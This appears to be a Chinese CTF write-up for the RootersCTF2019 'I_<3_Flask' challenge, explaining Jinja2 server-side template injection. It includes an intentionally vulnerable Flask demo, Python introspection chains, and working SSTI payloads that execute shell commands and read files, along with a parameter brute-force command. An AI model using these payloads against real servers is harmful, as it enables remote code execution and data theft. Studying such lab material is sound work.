# [RootersCTF2019]I_<3_Flask



## 0、知识点

>   考查的Python中flask框架中Jinja2渲染模板



## 1、关于Jinja2

>   jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页

### 基本语法

####  1、`{%%}`

**主要用来声明变量或用条件语句或循环语句**

条件和循环需要多一层`{%endif%}`或`{%endfor%}`结尾

```python
{% set c = 'Zh1z3ven' %}
{% if 1==1 %}Zh1z3ven{%endif%}
{% for i in [1, 2, 3] %}Zh1z3ven{%endfor%}
```

#### 2、`{{}}`

**将大括号内的表达式执行并输出结果到模板内，一般可以用来标记变量**

```python
{{98-2}}
```

#### 3、`{##}`

**注释**

#### 4、存在漏洞的demo

```python
from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)


@app.route('/')
def user():
    name = request.args.get('name')

    t = Template('''
    <html>
      <head>
        <title>Zh1z3ven</title>
      </head>
     <body>
          <h1>Hello, %s !</h1>
      </body>
    </html>

        ''' % (name))

    return t.render()

if __name__ == '__main__':
    app.run()
    
--------------------返回的结果为：------------------------------------
Hello, 96 !
```

>   **使用Template方法进行渲染会有这种问题，**
>
>   **但在flask中常用的渲染方法为：render_template()` 、 `render_template_string()**

>   **当使用 `render_template()` 时，扩展名为 `.html` 、 `.htm` 、 `.xml` 和 `.xhtml` 的模板中开启自动转义。**
>
>   ```python
>   from flask import Flask, render_template
>   
>   app = Flask(__name__)
>   
>   
>   @app.route('/')
>   def hello_world():
>       return render_template('index.html', name=name, movies=movies,test=test)
>   
>   
>   name = 'Grey Li'
>   movies = [
>       {'title': 'My Neighbor Totoro', 'year': '1988'},
>       {'title': 'Dead Poets Society', 'year': '1989'},
>       {'title': 'A Perfect World', 'year': '1993'},
>       {'title': 'Leon', 'year': '1994'},
>       {'title': 'Mahjong', 'year': '1996'},
>       {'title': 'Swallowtail Butterfly', 'year': '1996'},
>       {'title': 'King of Comedy', 'year': '1999'},
>       {'title': 'Devils on the Doorstep', 'year': '1999'},
>       {'title': 'WALL-E', 'year': '2008'},
>       {'title': 'The Pork of Music', 'year': '2012'},
>   ]
>   
>   
>   if __name__ == '__main__':
>       app.run()
>   
>   ```
>
>   **index.html内容为**
>
>   ```html
>   <!DOCTYPE html>
>   <html lang="en">
>   <head>
>       <meta charset="UTF-8">
>       <title>{{ name }}Title</title>
>   </head>
>   <body>
>       <h2>{{ name }}这是变量</h2>
>       <p>{{ movies|length }}Title</p>
>       <ul>
>           {% for movie in movies %}
>           <li>{{ movie.title }} - {{ movie.year }} - {{ movie['title'] }}</li>
>           {% endfor %}
>       </ul>
>   </body>
>   </html>
>   ```

>   **当使用 `render_template_string()` 时，字符串开启 自动转义**

>   上面就是一个简单且正常通过渲染的页面，
>
>   因为需要渲染的参数我们都在app.py中写死了，并未交给用户控制，所以不存在SSTI注入

**漏洞的成因**

-   存在用户可控参数。
-   参数可被带入渲染函数内直接执行，即{{}}可被带入代码中让jinja2模块识别并解析。





## 2、思路

知道以上知识点后解题方法就和以前写的这篇文章相似：https://peekaboo.show/week3-2/

不过还是重新温习一下

#### 1、`__class__`

>   Python中一切皆对象，**这个方法返回当前对象所属的类**

>   `"".__class__
>   <class 'str'>`

#### 2、`__bases__`

>   **以元组的形式返回应该类所之间集成的类，主要用来获取基类（object）**

>   `"".__class__.__bases__
>   (<class 'object'>,)`

#### 3、`__base__`

>    以字符串形式返回一个**类所直接继承的类**，也就是父类

>   `"".__class__.__base__
>   <class 'object'>`

#### 4、`__mro__`

>   **返回解析方法调用的顺序**

>   `"".__class__.__mro__
>   (<class 'str'>, <class 'object'>)`

#### 5、`__subclasses__()`

>   **获取类的所有子类，经常配合`__bases__`、`__mro__`来找读取文件或执行命令的类**

>   比如：`"".__class__.__bases__[0].__subclasses__()`
>
>   或者：`"".__class__.__mro__[1].__subclasses__()`

#### 6、`__init__`

>   **所有的可被当作模块导入的都包含`__init__`方法，它的功能相当于Java中构造函数**
>
>   **然后我们可以通过这个方法调用`__globals__`方法**

#### 7、`__globals__`

>   **所有函数都会有一个`__globals_`属性，**
>
>   **用于获取当前空间下可使用模块、方法以及变量，返回一个字典**

```python
import os

var = 1111

def fun():
    pass

class test:
    def __init__(self):
        pass


print(test.__init__.__globals__)

'''
以下为输出内容
{
    '__name__': '__main__',
    '__doc__': None, 
    '__package__': None, 
    '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x000001FEDA846CD0>, 
    '__spec__': None, 
    '__annotations__': {}, 
    '__builtins__': <module 'builtins' (built-in)>, 
    '__file__': 'D:\\pychar\\one\\Flask测试\\globals属性测试.py', 
    '__cached__': None, 
    'os': <module 'os' from 'D:\\program files\\python\\lib\\os.py'>, 
    'var': 1111, 
    'fun': <function fun at 0x000001FEDABEF160>, 
    'test': <class '__main__.test'>
}
'''
```

#### 8、`__builtins__`

**在Python2中为`__builtins__`和`__builtin__`**

>   `__builtins__：`**是内建名称空间，是这个模块本身定义的一个名称空间**
>
>   **在这个内建名称空间中存在一些经常用到内置函数，（也就是不用导包就可以调用的函数）：如`print(),str()`**
>
>   **而`__builtins__`实际上是一个引用`__builtin__`的软连接，而真正BIF在被定义时是在 `__builtin__` 模块中进行的。**
>
>   **BIF：是指内置函数**

**在python3中为 `__builtins__` 和 `builtins`**

这里**只不过** `__builtins__` **代替的** `__builtin__`

>   **哪些BIF可以直接调用可以使用：`dir(__builtins__)`查看**

#### 9、内省request对象

>   **即为Flask模板的一个全局变量request对象（flask.request），代表当前请求对象**



#### 10、利用思路

-   随便找一个内置类对象利用 `__class__`拿到该对象所对应的类

    -   ```python
        ''.__class__.__bases__[0].__subclasses__()
        ().__class__.__mro__[2].__subclasses__()
        ().__class__.__mro__[-1].__subclasses__()
        request.__class__.__mro__[1]
        ```

-   用 `__bases__` 或 `__mro__` 拿到基类 `<class 'object'>`

-   用 `__subclasses__()` 获取所有子类

-   在子类中寻找可以合适的继承链执行命令或读取文件

#### 11、测试姿势

##### 1、可以利用`___builtins__`自建命名空间调用BIF函数，

-   `eval`
-   `__import__`
-   `open`

##### 2、linecache执行命令

**先找到子类中有可直接调用linecache的，**

```python
<class 'traceback.FrameSummary'> 208
<class 'traceback.TracebackException'> 209
```

**在构造payload**

```python
{{
	[].__class__.__base__.__subclasses__()[208]
	.__init__.func_globals['linecache'].os.popen('whoami').read()
}}
```

##### 3、直接调用`__import__()`

**首先找到子类**

```nginx
<class '_frozen_importlib._ModuleLock'> 80
<class '_frozen_importlib._DummyModuleLock'> 81
<class '_frozen_importlib._ModuleLockManager'> 82
<class '_frozen_importlib.ModuleSpec'> 83
```

**payload**

```json
{{
	"".__class__.__bases__[0].__subclasses__()[80]
	.__init__.__globals__.
	__import__('os').popen('whoami').read()
}}
```

##### 4、利用循环构造payload

上面提到过 `{% for i in [1, 2, 3] %}Zh1z3ven{%endfor%}` 可用作循环。

我们改造下利用 `os._wrap_close` 类的 `['__builtins__']['eval']` 注入

```nginx
?name={{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')}}
```

**执行命令的payload**如下：

```nginx
这里有一个小坑点，比如：
	我们第一次if判断 if i.__name__ == '_wrap_close'时，
 	==右面不能写 os._wrap_close 而要写_wrap_close ,
    因为 __name__ 返回值是 _wrap_close
    
{% for i in "".__class__.__base__.__subclasses__() %}
    {% if i.__name__ == '_wrap_close' %}
      {% for x in i.__init__.__globals__.values() %}   
          {% if x.__class__ == {}.__class__ %}  # 筛选出dict类型元素
            {% if 'eval' in x.keys() %}  
                {{ x['eval']('__import__("os").popen("whoami").read()')}}
            {% endif %}
          {% endif %}
      {% endfor %}
    {% endif %}
{% endfor %}
```

**读取文件**

```php
{% for i in "".__class__.__base__.__subclasses__() %}
	{% if i.__name__ == '_wrap_close' %}		  
		{{
            i.__init__.__globals__['__builtins__'].
                open('C:\\Users\\LENOVO\\Desktop\\1.txt', 'r').readlines()
        }}
	{% endif %}
{% endfor %}
```

## 3、解题

>   首先查看题目，然后把题目翻遍了也没发现啥有用的信息，然后Google一波发现需要进行url爆破
>
>   然后就可以通过**Arjun**工具，**它一款http参数扫描器，主要就是爆破url参数的**

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303201444478.png)

**使用如下命令慢慢跑**

```nginx
python3 arjun -u http://0a3a91c2-cb84-4fa2-8558-0e75575209f1.node4.buuoj.cn:81/ -c 100 -d 5
```

>   最终的参数名称为：**name**

>   题目也很明显的告诉是flash漏洞，然后肯定是模板注入漏洞，开头也说了是jinji2的模板漏洞
>
>   然后就根据上面的知识进行注入就可以了，很容易就拿到flag

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303201448752.png)



>    **首先拿到网站的模块列表**

```nginx
http://0a3a91c2-cb84-4fa2-8558-0e75575209f1.node4.buuoj.cn:81/?name={{[].__class__.__base__.__subclasses__()}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303201453179.png)

****

>   **然后把这个列表复制下来直接筛选一下可以利用模块的位置**

```python
flashStr = '''
 [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'pickle.PickleBuffer'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class 'Context'>, <class 'ContextVar'>, <class 'Token'>, <class 'Token.MISSING'>, <class 'moduledef'>, <class 'module'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc_data'>, <class 'abc.ABC'>, <class 'dict_itemiterator'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'enum.auto'>, <enum 'Enum'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 'operator.itemgetter'>, <class 'operator.attrgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 're.Scanner'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'importlib.abc.Finder'>, <class 'importlib.abc.Loader'>, <class 'importlib.abc.ResourceReader'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'tokenize.Untokenizer'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '_ast.AST'>, <class 'ast.NodeVisitor'>, <class 'CArgObject'>, <class '_ctypes.CThunkObject'>, <class '_ctypes._CData'>, <class '_ctypes.CField'>, <class '_ctypes.DictRemover'>, <class '_ctypes.StructParam_Type'>, <class 'Struct'>, <class 'unpack_iterator'>, <class 'ctypes.CDLL'>, <class 'ctypes.LibraryLoader'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class 'select.poll'>, <class 'select.epoll'>, <class 'selectors.BaseSelector'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class '_sha512.sha384'>, <class '_sha512.sha512'>, <class '_random.Random'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.SpooledTemporaryFile'>, <class 'tempfile.TemporaryDirectory'>, <class '_socket.socket'>, <class 'datetime.timedelta'>, <class 'datetime.date'>, <class 'datetime.tzinfo'>, <class 'datetime.time'>, <class 'datetime.date'>, <class 'datetime.timedelta'>, <class 'datetime.time'>, <class 'datetime.tzinfo'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'email.charset.Charset'>, <class 'dis.Bytecode'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'textwrap.TextWrapper'>, <class '__future__._Feature'>, <class 'zipfile.ZipInfo'>, <class 'zipfile.LZMACompressor'>, <class 'zipfile.LZMADecompressor'>, <class 'zipfile._SharedFile'>, <class 'zipfile._Tellable'>, <class 'zipfile.ZipFile'>, <class 'zipfile.Path'>, <class 'pkgutil.ImpImporter'>, <class 'pkgutil.ImpLoader'>, <class 'pyexpat.xmlparser'>, <class 'plistlib.Data'>, <class 'plistlib.UID'>, <class 'plistlib._PlistParser'>, <class 'plistlib._DumbXMLWriter'>, <class 'plistlib._BinaryPlistParser'>, <class 'plistlib._BinaryPlistWriter'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class 'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'pkg_resources.extern.VendorImporter'>, <class 'pkg_resources._vendor.six._LazyDescr'>, <class 'pkg_resources._vendor.six._SixMetaPathImporter'>, <class 'pkg_resources._vendor.six._LazyDescr'>, <class 'pkg_resources._vendor.six._SixMetaPathImporter'>, <class 'pkg_resources._vendor.appdirs.AppDirs'>, <class 'pkg_resources.extern.packaging._structures.Infinity'>, <class 'pkg_resources.extern.packaging._structures.NegativeInfinity'>, <class 'pkg_resources.extern.packaging.version._BaseVersion'>, <class 'pkg_resources.extern.packaging.specifiers.BaseSpecifier'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class 'pkg_resources._vendor.pyparsing._Constants'>, <class 'pkg_resources._vendor.pyparsing._ParseResultsWithOffset'>, <class 'pkg_resources._vendor.pyparsing.ParseResults'>, <class 'pkg_resources._vendor.pyparsing.ParserElement._UnboundedCache'>, <class 'pkg_resources._vendor.pyparsing.ParserElement._FifoCache'>, <class 'pkg_resources._vendor.pyparsing.ParserElement'>, <class 'pkg_resources._vendor.pyparsing._NullToken'>, <class 'pkg_resources._vendor.pyparsing.OnlyOnce'>, <class 'pkg_resources._vendor.pyparsing.pyparsing_common'>, <class 'pkg_resources.extern.packaging.markers.Node'>, <class 'pkg_resources.extern.packaging.markers.Marker'>, <class 'pkg_resources.extern.packaging.requirements.Requirement'>, <class 'pkg_resources.IMetadataProvider'>, <class 'pkg_resources.WorkingSet'>, <class 'pkg_resources.Environment'>, <class 'pkg_resources.ResourceManager'>, <class 'pkg_resources.NullProvider'>, <class 'pkg_resources.NoDists'>, <class 'pkg_resources.EntryPoint'>, <class 'pkg_resources.Distribution'>, <class 'gunicorn.pidfile.Pidfile'>, <class 'gunicorn.sock.BaseSocket'>, <class 'gunicorn.arbiter.Arbiter'>, <class 'gettext.NullTranslations'>, <class 'argparse._AttributeHolder'>, <class 'argparse.HelpFormatter._Section'>, <class 'argparse.HelpFormatter'>, <class 'argparse.FileType'>, <class 'argparse._ActionsContainer'>, <class 'shlex.shlex'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.Session'>, <class 'ssl.SSLObject'>, <class 'gunicorn.reloader.InotifyReloader'>, <class 'gunicorn.config.Config'>, <class 'gunicorn.config.Setting'>, <class 'gunicorn.debug.Spew'>, <class 'gunicorn.app.base.BaseApplication'>, <class '_pickle.Unpickler'>, <class '_pickle.Pickler'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class '_queue.SimpleQueue'>, <class 'queue.Queue'>, <class 'queue._PySimpleQueue'>, <class 'logging.handlers.QueueListener'>, <class 'socketserver.BaseServer'>, <class 'socketserver.ForkingMixIn'>, <class 'socketserver.ThreadingMixIn'>, <class 'socketserver.BaseRequestHandler'>, <class 'logging.config.ConvertingMixin'>, <class 'logging.config.BaseConfigurator'>, <class 'gunicorn.glogging.Logger'>, <class 'gunicorn.http.unreader.Unreader'>, <class 'gunicorn.http.body.ChunkedReader'>, <class 'gunicorn.http.body.LengthReader'>, <class 'gunicorn.http.body.EOFReader'>, <class 'gunicorn.http.body.Body'>, <class 'gunicorn.http.message.Message'>, <class 'gunicorn.http.parser.Parser'>, <class 'gunicorn.http.wsgi.FileWrapper'>, <class 'gunicorn.http.wsgi.Response'>, <class 'gunicorn.workers.workertmp.WorkerTmp'>, <class 'gunicorn.workers.base.Worker'>, <class 'markupsafe._MarkupEscapeHelper'>, <class '_hashlib.HASH'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class '_sha3.sha3_224'>, <class '_sha3.sha3_256'>, <class '_sha3.sha3_384'>, <class '_sha3.sha3_512'>, <class '_sha3.shake_128'>, <class '_sha3.shake_256'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.nodes.Node'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContext'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'decimal.Decimal'>, <class 'decimal.Context'>, <class 'decimal.SignalDictMixin'>, <class 'decimal.ContextManager'>, <class 'numbers.Number'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <class 'werkzeug._internal._Missing'>, <class 'werkzeug._internal._DictAccessorProperty'>, <class 'werkzeug.utils.HTMLBuilder'>, <class 'werkzeug.exceptions.Aborter'>, <class 'werkzeug.urls.Href'>, <class 'email.message.Message'>, <class 'http.client.HTTPConnection'>, <class 'mimetypes.MimeTypes'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.types.ParamType'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'werkzeug.serving.WSGIRequestHandler'>, <class 'werkzeug.serving._SSLContext'>, <class 'werkzeug.serving.BaseWSGIServer'>, <class 'werkzeug.datastructures.ImmutableListMixin'>, <class 'werkzeug.datastructures.ImmutableDictMixin'>, <class 'werkzeug.datastructures.UpdateDictMixin'>, <class 'werkzeug.datastructures.ViewItems'>, <class 'werkzeug.datastructures._omd_bucket'>, <class 'werkzeug.datastructures.Headers'>, <class 'werkzeug.datastructures.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.IfRange'>, <class 'werkzeug.datastructures.Range'>, <class 'werkzeug.datastructures.ContentRange'>, <class 'werkzeug.datastructures.FileStorage'>, <class 'urllib.request.Request'>, <class 'urllib.request.OpenerDirector'>, <class 'urllib.request.BaseHandler'>, <class 'urllib.request.HTTPPasswordMgr'>, <class 'urllib.request.AbstractBasicAuthHandler'>, <class 'urllib.request.AbstractDigestAuthHandler'>, <class 'urllib.request.URLopener'>, <class 'urllib.request.ftpwrapper'>, <class 'werkzeug.wrappers.accept.AcceptMixin'>, <class 'werkzeug.wrappers.auth.AuthorizationMixin'>, <class 'werkzeug.wrappers.auth.WWWAuthenticateMixin'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.wrappers.base_request.BaseRequest'>, <class 'werkzeug.wrappers.base_response.BaseResponse'>, <class 'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>, <class 'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>, <class 'werkzeug.wrappers.etag.ETagRequestMixin'>, <class 'werkzeug.wrappers.etag.ETagResponseMixin'>, <class 'werkzeug.wrappers.cors.CORSRequestMixin'>, <class 'werkzeug.wrappers.cors.CORSResponseMixin'>, <class 'werkzeug.useragents.UserAgentParser'>, <class 'werkzeug.useragents.UserAgent'>, <class 'werkzeug.wrappers.user_agent.UserAgentMixin'>, <class 'werkzeug.wrappers.request.StreamOnlyMixin'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.wrappers.response.ResponseStreamMixin'>, <class 'http.cookiejar.Cookie'>, <class 'http.cookiejar.CookiePolicy'>, <class 'http.cookiejar.Absent'>, <class 'http.cookiejar.CookieJar'>, <class 'werkzeug.test._TestCookieHeaders'>, <class 'werkzeug.test._TestCookieResponse'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <class 'uuid.UUID'>, <class 'itsdangerous._json._CompactJSON'>, <class 'hmac.HMAC'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'itsdangerous.url_safe.URLSafeSerializerMixin'>, <class 'flask._compat._DeprecatedBool'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalStack'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local.LocalProxy'>, <class 'dataclasses._HAS_DEFAULT_FACTORY_CLASS'>, <class 'dataclasses._MISSING_TYPE'>, <class 'dataclasses._FIELD_BASE'>, <class 'dataclasses.InitVar'>, <class 'dataclasses.Field'>, <class 'dataclasses._DataclassParams'>, <class 'difflib.SequenceMatcher'>, <class 'difflib.Differ'>, <class 'difflib.HtmlDiff'>, <class 'werkzeug.routing.RuleFactory'>, <class 'werkzeug.routing.RuleTemplate'>, <class 'werkzeug.routing.BaseConverter'>, <class 'werkzeug.routing.Map'>, <class 'werkzeug.routing.MapAdapter'>, <class 'flask.signals.Namespace'>, <class 'flask.signals._FakeSignal'>, <class 'flask.helpers.locked_cached_property'>, <class 'flask.helpers._PackageBoundObject'>, <class 'flask.cli.DispatchingApp'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.config.ConfigAttribute'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'werkzeug.wrappers.json._JSONModule'>, <class 'werkzeug.wrappers.json.JSONMixin'>, <class 'flask.blueprints.BlueprintSetupState'>, <class 'jinja2.ext.Extension'>, <class 'jinja2.ext._CommentFinder'>]
'''
# 以分号分割字符串
flashStr = flashStr.split(',')

# 查找位置
for x in range(len(flashStr)):
    if '_wrap_close' in flashStr[x]:
        print('第', x, '位是：', flashStr[x])
```

### 1、解法一

**利用`_wrap_close`**

```py
第 132 位是：  <class 'os._wrap_close'>
```

**payload为：**

```nginx
?name={{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303201457053.png)

拿flag

```nginx
?name={{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat flag.txt").read()')}}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303201458097.png)

### 2、解法二

**利用`warnings.catch_warnings`**

**payload**

```nginx
{% for c in [].__class__.__base__.__subclasses__() %} 
  {% if c.__name__ == 'catch_warnings' %} 
    {% for b in c.__init__.__globals__.values() %} 
      {% if b.__class__ == {}.__class__ %}
        {% if 'eval' in b.keys() %} 
          {{ b['eval']('__import__("os").popen("ls").read()') }}
        {% endif %} 
      {% endif %} 
     {% endfor %} 
  {% endif %}
{% endfor %}
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfimg/web/three202303201516112.png)





参考文章：

